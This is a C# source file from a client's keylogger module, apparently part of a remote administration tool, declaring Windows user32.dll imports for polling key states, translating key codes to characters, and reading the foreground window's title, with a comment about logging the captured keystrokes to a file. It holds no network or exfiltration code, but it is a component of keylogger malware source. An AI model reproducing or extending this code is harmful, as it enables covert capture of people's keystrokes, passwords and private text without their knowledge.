using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace xClient.Core.Keylogger
{
    /// <summary>
    /// Provides calls to Native code for functions in the keylogger.
    /// </summary>
    public static class Win32
    {
        /// <summary>
        /// Translates (maps) a virtual-key code into a scan code or character value,
        /// or translates a scan code into a virtual-key code. The function
        /// translates the codes using the input language and an input locale identifier.
        /// </summary>
        /// <param name="uCode">The virtual-key code or scan code for a key</param>
        /// <param name="uMapType">The translation to perform.</param>
        /// <param name="dwhkl"></param>
        /// <returns>Returns </returns>
        [DllImport("user32.dll", CharSet = CharSet.Unicode, EntryPoint = "MapVirtualKeyExW", ExactSpelling = true)]
        internal static extern int MapVirtualKeyExW(int uCode, int uMapType, IntPtr dwhkl);

        [DllImport("user32.dll")]
        internal static extern short GetAsyncKeyState(KeyloggerKeys vKey);
        
        // The value passed to GetAsyncKeyState is scan code, so we need to translate
        // the data to virtual code, then to unicode character, then we can log to
        // the file.
        [DllImport("user32.dll")]
        internal static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int GetWindowText(int hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, ExactSpelling = true)]
        internal static extern int ToUnicodeEx(int wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff,
                                               int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        internal static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetKeyboardLayout(uint threadId);
    }
}